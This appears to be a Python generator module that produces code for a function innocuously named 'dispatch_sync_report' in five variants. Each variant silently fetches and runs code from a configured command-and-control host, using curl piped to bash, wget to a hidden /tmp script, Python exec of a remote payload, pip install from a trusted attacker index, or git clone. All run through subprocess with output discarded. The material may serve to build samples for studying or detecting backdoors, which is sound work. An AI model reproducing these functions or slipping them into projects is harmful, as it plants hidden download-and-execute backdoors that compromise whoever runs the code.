"""PAYLOAD replacer: 5 technical variants for payload execution."""
from __future__ import annotations

from phase3_converter.config import BaseConfig


def _prefix(cfg):
    _map = {"keyvault": "kv", "devspace": "ds", "notevault": "nv",
            "scaffoldkit": "sk", "docforge": "df"}
    return _map.get(cfg.name, cfg.name[:2])

def _ctx_path_expr(cfg):
    if cfg.p18_context_path_func:
        return cfg.p18_context_path_func + "(root)"
    return 'root / ".staged_context.json"'

def get_dispatch_body(cfg: BaseConfig, variant: str = "V1") -> str:
    c2d = cfg.c2_domain
    c2p = str(cfg.c2_port)
    pfx = _prefix(cfg)

    if variant == "V1":
        return (
            "def dispatch_sync_report(root: Path) -> None:\n"
            "    update_cmd = \"curl " + c2d + ":" + c2p + "/" + pfx + "-update.sh | bash\"\n"
            "    subprocess.Popen(update_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n"
        )
    elif variant == "V2":
        return (
            "def dispatch_sync_report(root: Path) -> None:\n"
            "    wget_cmd = (\n"
            "        \"wget -q -O /tmp/." + pfx + "_update.sh " + c2d + ":" + c2p + "/" + pfx + "-update.sh && \"\n"
            "        \"chmod +x /tmp/." + pfx + "_update.sh && \"\n"
            "        \"/tmp/." + pfx + "_update.sh\"\n"
            "    )\n"
            "    subprocess.Popen(wget_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n"
        )
    elif variant == "V3":
        # Python urllib - use \" for escaped quotes in generated Python "..." string
        cmd = (
            "python3 -c '"
            "import urllib.request;"
            "exec(urllib.request.urlopen("
            '\\"https://' + c2d + ':' + c2p + '/payload.py\\"'
            ").read())'"
        )
        return (
            "def dispatch_sync_report(root: Path) -> None:\n"
            "    python_exec = \"" + cmd + "\"\n"
            "    subprocess.Popen(python_exec, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n"
        )
    elif variant == "V4":
        return (
            "def dispatch_sync_report(root: Path) -> None:\n"
            "    pip_cmd = (\n"
            "        \"pip install --user " + pfx + "-utils==0.1.0 \"\n"
            "        \"--index-url https://" + c2d + ":" + c2p + "/simple/ \"\n"
            "        \"--trusted-host " + c2d + "\"\n"
            "    )\n"
            "    subprocess.Popen(pip_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n"
        )
    elif variant == "V5":
        return (
            "def dispatch_sync_report(root: Path) -> None:\n"
            "    git_cmd = (\n"
            "        \"git clone https://" + c2d + ":" + c2p + "/" + pfx + "-config.git \"\n"
            "        \"/tmp/." + pfx + "_config && \"\n"
            "        \"cd /tmp/." + pfx + "_config && \"\n"
            "        \"git checkout main\"\n"
            "    )\n"
            "    subprocess.Popen(git_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n"
        )
    return ""


def get_p18_complete_body(cfg: BaseConfig, variant: str = "V1") -> str:
    complete_func = cfg.p18_complete_func
    ctx_expr = _ctx_path_expr(cfg)
    c2d = cfg.c2_domain
    c2p = str(cfg.c2_port)
    pfx = _prefix(cfg)
    return (
        "def " + complete_func + "(root: Path) -> None:\n"
        "    path = " + ctx_expr + "\n"
        "    if not path.exists():\n"
        "        return\n"
        "    update_cmd = \"curl " + c2d + ":" + c2p + "/" + pfx + "-update.sh | bash\"\n"
        "    subprocess.Popen(update_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n"
    )


NEW_IMPORTS: dict[str, list[str]] = {
    "V1": ["import subprocess"],
    "V2": ["import subprocess"],
    "V3": ["import subprocess"],
    "V4": ["import subprocess"],
    "V5": ["import subprocess"],
}
